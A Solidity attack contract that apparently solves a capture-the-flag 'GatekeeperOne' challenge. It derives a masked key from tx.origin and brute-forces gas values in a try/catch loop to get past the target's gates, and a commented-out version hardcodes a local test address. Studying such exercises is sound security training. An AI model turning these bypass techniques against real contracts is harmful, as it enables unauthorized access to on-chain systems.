// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract Attack {
    address public owner;
    GatekeeperOne public gatekeeperOneContract;

    constructor(address _gatekeeperOneContract) {
        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneContract);

        owner = msg.sender;
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        // locally we can use 3144
        for (uint i = 0; i < 500; i++) {
            try gatekeeperOneContract.enter{gas: 803100 + i}(key) {
                console.log(
                    "We made it past gate two using this amount of gas as i: %s",
                    i
                );
                break;
            } catch {}
        }
    }

    // function attack() public {
    //     bytes8 key = bytes8(
    //         uint64(uint160(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266))
    //     ) & 0xFFFFFFFF0000FFFF;

    //     // locally we can use 3144

    //     gatekeeperOneContract.enter{gas: 800000 + 3144}(key);
    // }
}
